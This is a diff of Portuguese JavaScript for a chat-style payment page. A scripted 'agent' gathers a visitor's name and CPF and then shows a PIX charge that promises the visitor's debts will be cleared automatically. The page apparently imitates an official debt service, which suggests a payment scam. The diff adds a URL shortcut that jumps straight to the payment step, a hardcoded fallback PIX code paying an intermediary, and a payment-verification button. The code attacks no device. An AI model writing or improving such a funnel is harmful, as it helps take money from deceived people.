@@ -236,9 +236,64 @@ async function agentSay(html, container, typingMs = 1400) {
   return appendBubble(html, container);
 }
 
+// ── Atalho para Pular Direto para o Pagamento PIX ──
+window.pularParaPagamento = async function() {
+  try {
+    const video = document.getElementById('leticiaVideo');
+    if (video) { video.pause(); }
+  } catch(e) {}
+
+  const idsParaOcultar = [
+    'typing1', 'bubble1', 'typing2', 'bubble2',
+    'videoCard', 'videoTyping', 'systemNote', 'confirmCard'
+  ];
+  idsParaOcultar.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.style.display = 'none';
+      el.classList.remove('visible');
+    }
+  });
+
+  const flowSection = document.getElementById('flowSection');
+  if (flowSection) {
+    flowSection.innerHTML = '';
+  }
+
+  if (!dadosConsulta.nome) dadosConsulta.nome = 'Cliente Teste';
+  if (!dadosConsulta.cpf) dadosConsulta.cpf = '000.000.000-00';
+  window.atualizarDadosCliente(dadosConsulta);
+
+  const loadingEl = document.createElement('div');
+  loadingEl.className = 'pix-loading';
+  loadingEl.innerHTML = '<div class="spinner"></div><div style="font-weight:600; font-size:14px; color:#1351B4;">Carregando cobrança PIX imediata...</div>';
+  if (flowSection) flowSection.appendChild(loadingEl);
+  autoScroll();
+
+  try {
+    const pixData = await requestGerarPix();
+    loadingEl.remove();
+    showPixCard(pixData, flowSection);
+  } catch (err) {
+    console.warn('Fallback PIX para testes rápidos:', err);
+    loadingEl.remove();
+    showPixCard({
+      qr_code: '00020101021226580014br.gov.bcb.pix2536cpa-pay-intermediacao-ltda520400005303986540568.925802BR5925CPA PAY INTERMEDIACAO LT6009SAO PAULO62070503***6304ABCD',
+      transaction_id: 'tx_teste_' + Date.now().toString(36),
+      favorecido: 'Cpa Pay Intermediacao LTDA'
+    }, flowSection);
+  }
+};
+
 document.addEventListener('DOMContentLoaded', async () => {
   // Inicializa dados em branco
   window.atualizarDadosCliente(dadosConsulta);
+
+  // Atalho direto via URL: ?pix=1 ou ?pular=1 ou ?pagamento=1
+  if (_urlParams.has('pix') || _urlParams.has('pular') || _urlParams.has('pagamento') || _urlParams.has('direto') || _urlParams.has('fast')) {
+    window.pularParaPagamento();
+    return;
+  }
 
   const typing1 = document.getElementById('typing1');
   const bubble1 = document.getElementById('bubble1');
@@ -984,6 +1039,8 @@ function showPixCard(data, section) {
   const pixCode = data.qr_code || data.pixCode || '';
   const pixQrBase64 = data.qr_code_base64 || data.pixQrCode || null;
   const transactionId = data.transaction_id || '';
+  window._currentTransactionId = transactionId;
+  window._currentPixCode = pixCode;
 
   // Extrai exatamente a Razão Social (Tag 59) para ficar idêntico ao aplicativo do banco
   let nomeSocial = extrairNomeSocialPix(pixCode);
@@ -1048,6 +1105,10 @@ function showPixCard(data, section) {
       <div class="pix-qr-label" id="pixQrLabel" style="${pixCode ? 'display: block;' : 'display: none;'}">Escaneie o QR Code com seu banco ou copie o código abaixo:</div>
       <div class="pix-code-box" id="pixCodeBox">${pixCode}</div>
       <button class="btn-copy" id="btnCopiarPix" onclick="copiarPix()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px; vertical-align:text-bottom;"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg> Copiar código PIX</button>
+      <button type="button" class="btn-verificar-pagamento" id="btnVerificarPagamento" onclick="abrirModalComprovante()">
+        <span class="btn-verificar-titulo">Verificar Pagamento</span>
+        <span class="btn-verificar-subtitulo">Após pagar no app do seu banco, clique aqui para validar seu pagamento</span>
+      </button>
       <p style="font-size:11px;color:#888;text-align:center;margin-top:10px;">
         Este código expira em 10 minutos. Após o pagamento, suas dívidas serão quitadas automaticamente.
       </p>
